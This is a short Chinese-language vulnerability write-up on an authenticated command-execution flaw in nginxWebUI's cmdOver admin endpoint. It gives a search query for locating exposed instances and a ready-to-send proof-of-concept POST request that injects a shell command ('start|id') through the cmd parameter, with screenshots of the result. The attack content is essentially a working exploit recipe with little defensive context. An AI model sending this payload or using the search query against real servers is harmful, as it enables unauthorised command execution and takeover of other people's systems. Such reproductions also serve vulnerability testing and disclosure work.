# nginxWebUI cmdOver 后台命令执行漏洞

## 漏洞描述

nginxWebUI 后台存在命令执行漏洞，攻击者登录后台后可以执行任意命令获取服务器权限

## 漏洞影响

<a-checkbox checked>nginxWebUI </a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="nginxwebui"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1656223039336-00b1d204-6cba-4178-b152-fa38c63a72c1.png)

验证请求包

```php
POST /adminPage/remote/cmdOver

remoteId=local&cmd=start|id&interval=1
```

![img](../../../.vuepress/public/img/1656223447202-743e2c21-d042-4811-b135-d67b4155791e.png)